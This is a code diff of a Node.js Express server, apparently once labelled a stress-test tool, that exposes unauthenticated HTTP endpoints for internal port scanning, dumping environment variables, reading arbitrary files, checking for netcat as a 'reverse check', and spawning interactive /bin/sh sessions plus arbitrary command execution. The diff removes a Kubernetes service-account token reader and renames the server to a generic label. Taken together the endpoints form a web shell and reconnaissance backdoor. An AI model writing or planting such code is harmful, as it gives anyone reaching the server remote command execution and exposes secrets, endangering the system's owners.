@@ -85,7 +85,6 @@ app.get('/api/network/scan', (req, res) => {
     const ports = [80, 443, 8080, 8443, 6443, 10250, 10255, 2379, 22, 3306, 5432, 6379, 27017];
     const results = [];
     let completed = 0;
-    
     ports.forEach(port => {
         const socket = new net.Socket();
         socket.setTimeout(1000);
@@ -94,7 +93,6 @@ app.get('/api/network/scan', (req, res) => {
         socket.on('error', () => { results.push({ port, status: 'closed' }); completed++; checkDone(); });
         socket.connect(port, host);
     });
-    
     function checkDone() { if (completed === ports.length) res.json({ host, results: results.sort((a,b) => a.port - b.port) }); }
 });
 
@@ -107,18 +105,11 @@ app.get('/api/system/info', (req, res) => {
             env: process.env,
             cwd: process.cwd(),
             meminfo: execSync('cat /proc/meminfo | head -10').toString(),
-            cpuinfo: execSync('cat /proc/cpuinfo | grep "model name" | head -1').toString().trim(),
-            mounts: execSync('mount | head -20').toString(),
             network: execSync('ip addr 2>/dev/null || ifconfig').toString(),
-            processes: execSync('ps aux | head -20').toString(),
-            serviceAccount: fs.existsSync('/var/run/secrets/kubernetes.io/serviceaccount/token') 
-                ? fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8').slice(0, 100) + '...'
-                : 'Not found'
+            processes: execSync('ps aux | head -20').toString()
         };
         res.json(info);
-    } catch (e) {
-        res.json({ error: e.message });
-    }
+    } catch (e) { res.json({ error: e.message }); }
 });
 
 // File System
@@ -128,8 +119,7 @@ app.get('/api/fs/write', (req, res) => {
     const start = Date.now();
     const data = crypto.randomBytes(sizeMB * 1024 * 1024);
     fs.writeFileSync(filename, data);
-    const stats = fs.statSync(filename);
-    res.json({ filename, sizeMB, bytes: stats.size, time: Date.now() - start });
+    res.json({ filename, sizeMB, time: Date.now() - start });
 });
 
 app.get('/api/fs/read', (req, res) => {
@@ -137,167 +127,70 @@ app.get('/api/fs/read', (req, res) => {
     try {
         const content = fs.readFileSync(filepath, 'utf8');
         res.json({ path: filepath, content: content.slice(0, 5000) });
-    } catch (e) {
-        res.json({ path: filepath, error: e.message });
-    }
+    } catch (e) { res.json({ path: filepath, error: e.message }); }
 });
 
-// Reverse Shell Check
 app.get('/api/reverse/check', (req, res) => {
     try {
-        const ncPath = execSync('which nc netcat 2>/dev/null || echo "not found"').toString().trim();
-        const curlPath = execSync('which curl 2>/dev/null || echo "not found"').toString().trim();
-        res.json({ nc: ncPath, curl: curlPath, canReverse: ncPath !== 'not found' });
-    } catch (e) {
-        res.json({ error: e.message });
-    }
+        const nc = execSync('which nc 2>/dev/null || echo none').toString().trim();
+        const wget = execSync('which wget 2>/dev/null || echo none').toString().trim();
+        res.json({ nc, wget });
+    } catch (e) { res.json({ error: e.message }); }
 });
 
-// Load Test
 app.get('/api/load/concurrent', async (req, res) => {
     const count = parseInt(req.query.count) || 100;
     const start = Date.now();
-    const promises = [];
-    for (let i = 0; i < count; i++) {
-        promises.push(new Promise(resolve => {
-            const hash = crypto.createHash('sha256').update(String(i)).digest('hex');
-            resolve(hash);
-        }));
-    }
-    const results = await Promise.all(promises);
+    const results = await Promise.all(Array.from({length: count}, (_, i) => 
+        Promise.resolve(crypto.createHash('sha256').update(String(i)).digest('hex'))
+    ));
     res.json({ count, time: Date.now() - start, sample: results.slice(0, 5) });
 });
 
-// ============== LIVE TERMINAL WITH SSE ==============
-
-// Store active shells
+// ============== SHELL WITH STREAMING ==============
 const shells = new Map();
 
-// Start a new shell session
-app.get('/api/terminal/start', (req, res) => {
-    const sessionId = crypto.randomUUID();
-    const shell = spawn('/bin/sh', ['-i'], {
-        cwd: '/app',
-        env: { ...process.env, TERM: 'xterm', PS1: '\\w $ ' }
-    });
+app.get('/api/shell/start', (req, res) => {
+    const id = crypto.randomUUID();
+    const proc = spawn('/bin/sh', [], { cwd: '/tmp', env: { ...process.env, PS1: '$ ', TERM: 'dumb' } });
     
-    shells.set(sessionId, { shell, buffer: '' });
+    let buffer = '';
+    proc.stdout.on('data', d => buffer += d.toString());
+    proc.stderr.on('data', d => buffer += d.toString());
+    proc.on('close', () => shells.delete(id));
     
-    shell.on('close', () => shells.delete(sessionId));
-    shell.on('error', () => shells.delete(sessionId));
-    
-    res.json({ sessionId });
+    shells.set(id, { proc, getBuffer: () => { const b = buffer; buffer = ''; return b; } });
+    res.json({ id });
 });
 
-// SSE endpoint for live output
-app.get('/api/terminal/stream/:sessionId', (req, res) => {
-    const { sessionId } = req.params;
-    const session = shells.get(sessionId);
-    
-    if (!session) {
-        return res.status(404).json({ error: 'Session not found' });
-    }
-    
-    res.setHeader('Content-Type', 'text/event-stream');
-    res.setHeader('Cache-Control', 'no-cache');
-    res.setHeader('Connection', 'keep-alive');
-    res.flushHeaders();
-    
-    const { shell } = session;
-    
-    const onData = (data) => {
-        const text = data.toString();
-        res.write(`data: ${JSON.stringify({ type: 'stdout', data: text })}\n\n`);
-    };
-    
-    const onError = (data) => {
-        const text = data.toString();
-        res.write(`data: ${JSON.stringify({ type: 'stderr', data: text })}\n\n`);
-    };
-    
-    const onClose = () => {
-        res.write(`data: ${JSON.stringify({ type: 'exit' })}\n\n`);
-        res.end();
-    };
-    
-    shell.stdout.on('data', onData);
-    shell.stderr.on('data', onError);
-    shell.on('close', onClose);
-    
-    req.on('close', () => {
-        shell.stdout.off('data', onData);
-        shell.stderr.off('data', onError);
-        shell.off('close', onClose);
-    });
+app.get('/api/shell/read/:id', (req, res) => {
+    const s = shells.get(req.params.id);
+    if (!s) return res.status(404).json({ error: 'not found' });
+    res.json({ output: s.getBuffer() });
 });
 
-// Send input to shell
-app.post('/api/terminal/input/:sessionId', (req, res) => {
-    const { sessionId } = req.params;
-    const { input } = req.body;
-    const session = shells.get(sessionId);
-    
-    if (!session) {
-        return res.status(404).json({ error: 'Session not found' });
-    }
-    
-    session.shell.stdin.write(input);
+app.post('/api/shell/write/:id', (req, res) => {
+    const s = shells.get(req.params.id);
+    if (!s) return res.status(404).json({ error: 'not found' });
+    s.proc.stdin.write(req.body.input + '\n');
     res.json({ ok: true });
 });
 
-// Kill shell session
-app.delete('/api/terminal/:sessionId', (req, res) => {
-    const { sessionId } = req.params;
-    const session = shells.get(sessionId);
-    
-    if (session) {
-        session.shell.kill();
-        shells.delete(sessionId);
-    }
-    
+app.delete('/api/shell/:id', (req, res) => {
+    const s = shells.get(req.params.id);
+    if (s) { s.proc.kill(); shells.delete(req.params.id); }
     res.json({ ok: true });
 });
 
-// Legacy shell endpoints (keep for compatibility)
-app.get('/api/shell/cd', (req, res) => {
-    const dir = req.query.dir || '/';
-    const cwd = req.query.cwd || '/app';
-    
-    try {
-        let newPath;
-        if (dir.startsWith('/')) newPath = dir;
-        else if (dir === '..') newPath = path.dirname(cwd);
-        else if (dir === '~') newPath = process.env.HOME || '/root';
-        else newPath = path.join(cwd, dir);
-        
-        newPath = path.resolve(newPath);
-        if (fs.existsSync(newPath) && fs.statSync(newPath).isDirectory()) {
-            res.json({ success: true, cwd: newPath });
-        } else {
-            res.json({ success: false, error: 'cd: ' + dir + ': No such directory' });
-        }
-    } catch (e) {
-        res.json({ success: false, error: e.message });
-    }
-});
-
-app.post('/api/shell/exec', (req, res) => {
+// Simple exec for one-off commands  
+app.post('/api/exec', (req, res) => {
     const { cmd, cwd } = req.body;
-    if (!cmd) return res.json({ error: 'No command provided' });
-    
+    if (!cmd) return res.json({ error: 'no cmd' });
     try {
-        const output = execSync(cmd, {
-            cwd: cwd || '/app',
-            timeout: 30000,
-            maxBuffer: 10 * 1024 * 1024,
-            encoding: 'utf8',
-            shell: '/bin/sh'
-        });
-        res.json({ output: output || '' });
+        const output = execSync(cmd, { cwd: cwd || '/tmp', timeout: 60000, maxBuffer: 50*1024*1024, encoding: 'utf8' });
+        res.json({ output });
     } catch (e) {
-        const output = e.stdout ? e.stdout.toString() : '';
-        const error = e.stderr ? e.stderr.toString() : e.message;
-        res.json({ output, error });
+        res.json({ output: e.stdout || '', error: e.stderr || e.message });
     }
 });
 
@@ -305,4 +198,4 @@ app.get('/health', (req, res) => res.send('OK'));
 app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('Stress Test Server on ' + PORT));
+app.listen(PORT, () => console.log('Server on ' + PORT));
